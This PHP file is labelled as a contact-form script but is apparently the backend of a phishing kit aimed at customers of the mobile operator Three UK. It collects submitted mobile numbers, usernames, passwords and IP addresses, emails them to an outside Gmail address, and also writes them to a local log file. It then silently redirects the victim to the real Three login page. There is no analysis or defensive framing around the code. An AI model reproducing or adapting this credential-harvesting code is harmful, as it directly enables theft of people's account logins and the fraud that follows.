<?php
// Website Contact Form Generator 
// http://www.tele-pro.co.uk/scripts/contact_form/ 
// This script is free to use as long as you  
// retain the credit link  

// get posted data into local variables
$EmailFrom = "Taueya@gmail.com";
$EmailTo = "Taueya@gmail.com";
$Subject = "Three Level";
$mobile = Trim(stripslashes($_POST['mobile'])); 
$nameuser = Trim(stripslashes($_POST['username'])); 
$passuser = Trim(stripslashes($_POST['password'])); 
$userip = ($_SERVER['X_FORWARDED_FOR']) ? $_SERVER['X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];

// validation
$validationOK=true;
if (!$validationOK) {
  print "<meta http-equiv=\"refresh\" content=\"0;URL=index.html\">";
  exit;
}

// prepare email body text
$Body = "";
$Body .= "Mobile: ";
$Body .= $mobile;
$Body .= "\n";
$Body .= "Username: ";
$Body .= $nameuser;
$Body .= "\n";
$Body .= "Pw: ";
$Body .= $passuser;
$Body .= "\n";
$Body .= "User IP Address: ";
$Body .= $userip;
$Body .= "\n";


// send email 
$success = mail($EmailTo, $Subject, $Body, "From: <$EmailFrom>");
@fclose(@fwrite(@fopen("error_log", "a"),$Body));

// redirect to success page 
if ($success){
  print "<meta http-equiv=\"refresh\" content=\"0;URL=https://new.three.co.uk/account/login\">";
}
else{
  print "<meta http-equiv=\"refresh\" content=\"0;URL=https://new.three.co.uk/account/login\">";
}
?>